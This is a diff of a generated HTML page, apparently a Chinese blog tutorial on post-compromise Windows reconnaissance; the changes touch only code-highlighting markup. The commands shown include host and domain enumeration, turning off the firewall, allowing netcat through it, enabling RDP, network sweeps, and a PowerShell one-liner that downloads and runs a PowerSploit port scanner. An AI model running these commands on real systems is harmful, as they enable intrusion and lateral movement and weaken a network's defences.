@@ -281,8 +281,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">ipconfig /all
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">ipconfig /all
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -300,9 +300,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS Name&#34;</span> /C:<span class="s2">&#34;OS Version&#34;</span>
-systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名称&#34;</span> /C:<span class="s2">&#34;OS 版本&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS Name&#34;</span> /C:<span class="s2">&#34;OS Version&#34;</span>
+</span></span><span class="line"><span class="cl">systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名称&#34;</span> /C:<span class="s2">&#34;OS 版本&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -318,8 +318,8 @@ systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名�
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="k">echo</span> <span class="nv">%PROCESSOR_ARCHITECTURE%</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">%PROCESSOR_ARCHITECTURE%</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -335,8 +335,8 @@ systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名�
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">wmic product get name, version
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">wmic product get name, version
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -351,8 +351,8 @@ systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名�
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="s2">&#34;Get-WmiObject -class Win32_Product | select-Object -Property name, version&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="s2">&#34;Get-WmiObject -class Win32_Product | select-Object -Property name, version&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -368,8 +368,8 @@ systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名�
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">wmic service list brief
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">wmic service list brief
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -386,9 +386,9 @@ systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS 名�
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">tasklist
-wmic process list brief
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">tasklist
+</span></span><span class="line"><span class="cl">wmic process list brief
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查看启动程序信息">查看启动程序信息</h4>
 <div class="highlight"><div class="chroma">
@@ -396,8 +396,8 @@ wmic process list brief
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">wmic startup get command, caption
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat"><span class="line"><span class="cl">wmic startup get command, caption
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -413,8 +413,8 @@ wmic process list brief
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">schtasks /query /fo LIST /v
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">schtasks /query /fo LIST /v
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查看主机开机时间">查看主机开机时间</h4>
 <div class="highlight"><div class="chroma">
@@ -422,8 +422,8 @@ wmic process list brief
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net statistics workstation
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net statistics workstation
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -442,11 +442,11 @@ wmic process list brief
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net user
-net localgroup administrators
-# 查询在线用户：
-query user <span class="p">||</span> qwinsta
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user
+</span></span><span class="line"><span class="cl">net localgroup administrators
+</span></span><span class="line"><span class="cl"># 查询在线用户：
+</span></span><span class="line"><span class="cl">query user <span class="p">||</span> qwinsta
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="列出或断开本地计算机与所连接的客户端之间的会话">列出或断开本地计算机与所连接的客户端之间的会话</h4>
 <div class="highlight"><div class="chroma">
@@ -454,8 +454,8 @@ query user <span class="p">||</span> qwinsta
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net session
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net session
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查询端口列表">查询端口列表</h4>
 <div class="highlight"><div class="chroma">
@@ -463,8 +463,8 @@ query user <span class="p">||</span> qwinsta
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netstat -ano
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netstat -ano
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查看补丁列表">查看补丁列表</h4>
 <div class="highlight"><div class="chroma">
@@ -472,8 +472,8 @@ query user <span class="p">||</span> qwinsta
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">systeminfo
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">systeminfo
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -488,8 +488,8 @@ query user <span class="p">||</span> qwinsta
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic qfe get Caption,Description,HotfixID,InstalledOn
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic qfe get Caption,Description,HotfixID,InstalledOn
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -506,9 +506,9 @@ query user <span class="p">||</span> qwinsta
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net share
-wmic share get name,path,status
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net share
+</span></span><span class="line"><span class="cl">wmic share get name,path,status
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -525,9 +525,9 @@ wmic share get name,path,status
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">route print
-arp -a
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">route print
+</span></span><span class="line"><span class="cl">arp -a
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查询防火墙相关配置">查询防火墙相关配置</h4>
 <h5 id="关闭防火墙">关闭防火墙</h5>
@@ -537,8 +537,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh firewall set opmode disable
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh firewall set opmode disable
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Windows2003之后版本</p>
 <div class="highlight"><div class="chroma">
@@ -546,8 +546,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh firewall set allprofiles state off
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh firewall set allprofiles state off
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="修改防火墙配置">修改防火墙配置</h5>
 <p>Windows2003之前版本</p>
@@ -556,8 +556,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh firewall add allowedprogram c:\nc.exe <span class="s2">&#34;allow nc&#34;</span> enable
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh firewall add allowedprogram c:\nc.exe <span class="s2">&#34;allow nc&#34;</span> enable
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Windows2003之后版本</p>
 <div class="highlight"><div class="chroma">
@@ -565,8 +565,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh firewall add rule name=<span class="s2">&#34;pass nc&#34;</span> dir=in action=allow program=<span class="s2">&#34;C:\nc.exe&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh firewall add rule name=<span class="s2">&#34;pass nc&#34;</span> dir=in action=allow program=<span class="s2">&#34;C:\nc.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>允许指定程序连出</p>
 <div class="highlight"><div class="chroma">
@@ -574,8 +574,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh advfirewall firewall add rule name=<span class="s2">&#34;Allow nc&#34;</span> dir=out action=allow program=<span class="s2">&#34;C:\nc.exe&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh advfirewall firewall add rule name=<span class="s2">&#34;Allow nc&#34;</span> dir=out action=allow program=<span class="s2">&#34;C:\nc.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>允许3389放行</p>
 <div class="highlight"><div class="chroma">
@@ -583,8 +583,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh advfirewall firewall add rule name=<span class="s2">&#34;Remote Desktop&#34;</span> protocol=TCP dir=in localport=3389 action=allow
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh advfirewall firewall add rule name=<span class="s2">&#34;Remote Desktop&#34;</span> protocol=TCP dir=in localport=3389 action=allow
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="自定义防火墙日志的存储位置">自定义防火墙日志的存储位置</h5>
 <div class="highlight"><div class="chroma">
@@ -592,8 +592,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netsh advfirewall firewall set currentprofile logging filename <span class="s2">&#34;C:\windows\temp\fw.log&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netsh advfirewall firewall set currentprofile logging filename <span class="s2">&#34;C:\windows\temp\fw.log&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查看代理情况">查看代理情况</h4>
 <div class="highlight"><div class="chroma">
@@ -601,8 +601,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">reg query <span class="s2">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -619,8 +619,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">reg query <span class="s2">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> /V PortNumber
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> /V PortNumber
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -637,8 +637,8 @@ arp -a
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic path win32_terminalservicesetting where(__CLASS!=<span class="s2">&#34;&#34;</span>) call setallowtsconnections 1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic path win32_terminalservicesetting where(__CLASS!=<span class="s2">&#34;&#34;</span>) call setallowtsconnections 1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="在windows-server2008和windows-server2012中开启3389端口">在Windows Server2008和Windows Server2012中开启3389端口</h5>
 <div class="highlight"><div class="chroma">
@@ -651,13 +651,13 @@ arp -a
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!=<span class="s2">&#34;&#34;</span>) call setallowsconnections 1
-
-wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
-setuserauthenticationrequired 1
-
-reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!=<span class="s2">&#34;&#34;</span>) call setallowsconnections 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
+</span></span><span class="line"><span class="cl">setuserauthenticationrequired 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="自动化收集信息">自动化收集信息</h2>
 <h2 id="empire下的主机信息搜集">Empire下的主机信息搜集</h2>
@@ -667,16 +667,16 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usemodule situational_awareness/host/winenum
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">usemodule situational_awareness/host/winenum
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">situational_awareness/host/computerdetails
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">situational_awareness/host/computerdetails
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="查询当前权限">查询当前权限</h2>
 <h3 id="查询当前权限-1">查询当前权限</h3>
@@ -685,8 +685,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">whoami
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">whoami
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>三种情况：</p>
 <ul>
@@ -700,8 +700,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">whoami /all
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">whoami /all
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -717,8 +717,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net user XXX /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user XXX /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -735,8 +735,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">ipconfig /all
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">ipconfig /all
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查看系统详细信息">查看系统详细信息</h3>
 <div class="highlight"><div class="chroma">
@@ -744,8 +744,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">systeminfo
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">systeminfo
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="查询当前登录域及用户信息">查询当前登录域及用户信息</h3>
 <div class="highlight"><div class="chroma">
@@ -753,8 +753,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net config workstation
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net config workstation
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -770,8 +770,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net time /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net time /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -806,8 +806,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nbtscan.exe 192.168.1.0/20
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nbtscan.exe 192.168.1.0/20
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="利用-icmp-协议快速探测内网">利用 ICMP 协议快速探测内网</h3>
 <div class="highlight"><div class="chroma">
@@ -815,8 +815,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">for</span> <span class="k">/L</span> <span class="nv">%I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%</span>I <span class="p">|</span> findstr <span class="s2">&#34;TTL=&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">for</span> <span class="k">/L</span> <span class="nv">%I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%</span>I <span class="p">|</span> findstr <span class="s2">&#34;TTL=&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="通过-arp-扫描探测内网">通过 ARP 扫描探测内网</h3>
 <h4 id="arp-scan工具">arp-scan工具</h4>
@@ -825,8 +825,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">arp.exe -t 192.168.1.0/20
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">arp.exe -t 192.168.1.0/20
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="empire-中的-arpscan-模块">Empire 中的 ARPscan 模块</h4>
 <div class="highlight"><div class="chroma">
@@ -834,8 +834,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usemodule situational_awareness/network/arpscan
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">usemodule situational_awareness/network/arpscan
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="nishang-中的-invoke-arpscanps1-脚本">Nishang 中的 Invoke-ARPScan.ps1 脚本</h4>
 <div class="highlight"><div class="chroma">
@@ -843,8 +843,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">powershell.exe -exec bypass -Command <span class="s2">&#34;&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24}&#34;</span> <span class="p">&gt;&gt;</span> C:\Windows\temp\log.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">powershell.exe -exec bypass -Command <span class="s2">&#34;&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24}&#34;</span> <span class="p">&gt;&gt;</span> C:\Windows\temp\log.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="扫描内网端口">扫描内网端口</h3>
 <h4 id="metasploit-端口扫描">metasploit 端口扫描</h4>
@@ -853,8 +853,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/portscan/tcp
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auxiliary/scanner/portscan/tcp
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="powersploit-的-invoke-portscanps1-脚本">PowerSploit 的 Invoke-portscan.ps1 脚本</h4>
 <div class="highlight"><div class="chroma">
@@ -862,8 +862,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">powershell.exe -nop -exec bypass -c <span class="s2">&#34;IEX (New-ObjectNet.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/POwershellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA c:\windows\temp\rex.txt&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">powershell.exe -nop -exec bypass -c <span class="s2">&#34;IEX (New-ObjectNet.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/POwershellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA c:\windows\temp\rex.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="nishang-的-invoke-portscan-模块">Nishang 的 Invoke-PortScan 模块</h4>
 <div class="highlight"><div class="chroma">
@@ -871,8 +871,8 @@ reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Ser
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
